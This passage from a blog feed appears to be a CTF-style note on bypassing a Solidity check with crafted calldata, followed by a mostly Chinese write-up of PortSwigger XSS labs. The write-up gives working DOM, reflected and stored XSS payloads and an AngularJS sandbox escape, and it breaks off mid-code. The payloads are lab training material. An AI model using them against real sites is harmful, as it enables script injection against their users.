&lt;p&gt;Briefly saying,  Calldata Encoding Essentials for Dynamic Types, including string, bytes and arrays, encode using &lt;code&gt;offset - length - data&lt;&#x2F;code&gt; segment to encoding. Allowing us to bypass the check by modifying the offset.&lt;&#x2F;p&gt;
&lt;p&gt;by moving the data content(length and value) after the address param(to):&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;await &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendTransaction&lt;&#x2F;span&gt;&lt;span&gt;({from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;player&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;})
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Portswigger Web lab writeup: Cross-site scripting</title>
        <published>2023-08-29T00:00:00+08:00</published>
        <updated>2023-08-29T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/webacademyxss/"/>
        <id>/blog/webacademyxss/</id>
        
        <content type="html" xml:base="/blog/webacademyxss/">&lt;p&gt;&lt;em&gt;前面还有几道以前做的 毕竟简单不是很有必要重新记录&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;dom-based&quot;&gt;DOM XSS&lt;&#x2F;a&gt; in jQuery selector sink using a hashchange event&lt;&#x2F;h2&gt;
&lt;p&gt;JQuery:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;(window)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;on&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;hashchange&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span&gt;(){
&lt;&#x2F;span&gt;&lt;span&gt;                            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;post &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;section.blog-list h2:contains(&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;decodeURIComponent&lt;&#x2F;span&gt;&lt;span&gt;(window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;location&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;slice&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;)&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(post) post&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;scrollIntoView&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                        })&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;当 URL 的片段标识符更改时，将触发&lt;strong&gt;hashchange&lt;&#x2F;strong&gt;事件，传递到 Jquery 选择器，选择到 h2 中 存在 &lt;code&gt;decodeURIComponent(window.location.hash.slice(1))&lt;&#x2F;code&gt; 的元素（自然是不存在）。然后&lt;code&gt;scrollIntoView()&lt;&#x2F;code&gt;使用户可见。&lt;&#x2F;p&gt;
&lt;p&gt;因而 payload 要触发 haschange 事件。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;iframe &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;YOUR-LAB-ID.web-security-academy.net&#x2F;#&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;onload&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;img src=x onerror=print()&amp;gt;&amp;#39;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;&amp;lt;&#x2F;iframe&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; into attribute with angle brackets HTML-encoded&lt;&#x2F;h2&gt;
&lt;p&gt;属性注入。这个我熟&lt;&#x2F;p&gt;
&lt;p&gt;查阅 https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot; autofocus onfocusin=alert(window.origin) b=&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;stored&quot;&gt;Stored XSS&lt;&#x2F;a&gt; into anchor &lt;code&gt;href&lt;&#x2F;code&gt; attribute with double quotes HTML-encoded&lt;&#x2F;h2&gt;
&lt;p&gt;要实现点击名字的时候alert，测试发现点击跳转到填入的website。js伪协议直接过&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#5e81ac;&quot;&gt;javascript&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;alert&lt;&#x2F;span&gt;&lt;span&gt;(window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;也就是a.href的滥用&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;reflected&quot;&gt;Reflected XSS&lt;&#x2F;a&gt; into a JavaScript string with angle brackets HTML encoded&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;searchTerms &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;search参数&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;img src=&amp;quot;&#x2F;resources&#x2F;images&#x2F;tracker.gif?searchTerms=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;encodeURIComponent&lt;&#x2F;span&gt;&lt;span&gt;(searchTerms)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;quot;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;JS的内容直接来源于参数，应该是做了啥模板渲染的。注入js代码&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;%27;%0aalert(window.origin);%0ab=&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-dom-xss-in-document-write-sink-using-source-location-search-inside-a-select&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;dom-based&quot;&gt;DOM XSS&lt;&#x2F;a&gt; in &lt;code&gt;document.write&lt;&#x2F;code&gt; sink using source &lt;code&gt;location.search&lt;&#x2F;code&gt; inside a select&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;stores &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;London&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Paris&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Milan&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;store &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;URLSearchParams&lt;&#x2F;span&gt;&lt;span&gt;(window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;location&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;search))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;storeId&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;select name=&amp;quot;storeId&amp;quot;&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(store) {
&lt;&#x2F;span&gt;&lt;span&gt;    document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;option selected&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;store&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;&#x2F;option&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;stores&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(stores[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=== &lt;&#x2F;span&gt;&lt;span&gt;store) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;continue&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;option&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;stores[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;&#x2F;option&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;document&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;&amp;lt;&#x2F;select&amp;gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;直接Inject&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;product?productId=1&amp;amp;storeId=&amp;lt;script&amp;gt;alert(window.origin)&amp;lt;&#x2F;script&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded&quot;&gt;Lab: &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;dom-based&quot;&gt;DOM XSS&lt;&#x2F;a&gt; in AngularJS expression with angle brackets and double quotes HTML-encoded&lt;&#x2F;h2&gt;
&lt;p&gt;url参数在&lt;code&gt;&amp;gt;&amp;lt;&lt;&#x2F;code&gt;中间，尖括号转义。无法逃出&lt;&#x2F;p&gt;
&lt;p&gt;而由于AngularJS的引入，可以 CSTI&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;{{$on.constructor(&amp;#39;alert(window.origin)&amp;#39;)()}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;另外 AngularJS gadget (SSTI)还可以用来 bypass CSP 。payload 收集：https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;XSS%20Injection&#x2F;XSS%20in%20Angular.md 以及 https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;cheat-sheet#angularjs-sandbox-escapes-reflected&lt;&#x2F;p&gt;
&lt;h2 id=&quot;lab-reflected-dom-xss&quot;&gt;Lab: Reflected &lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;cross-site-scripting&#x2F;dom-based&quot;&gt;DOM XSS&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span&gt;(path) {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;xhr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    xhr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;onreadystatechange &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= function&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this.&lt;&#x2F;span&gt;&lt;span&gt;readyState &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; this.&lt;&#x2F;span&gt;&lt;span&gt;status &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;var searchResultsObj = &amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ this.&lt;&#x2F;span&gt;&lt;span&gt;responseText)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;displaySearchResults&lt;&#x2F;span&gt;&lt;span&gt;(searchResultsObj)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    xhr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;GET&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;path &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;window&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;location&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;search)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    xhr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;displaySearchResults&lt;&#x2F;span&gt;&lt;span&gt;(searchResultsObj) {
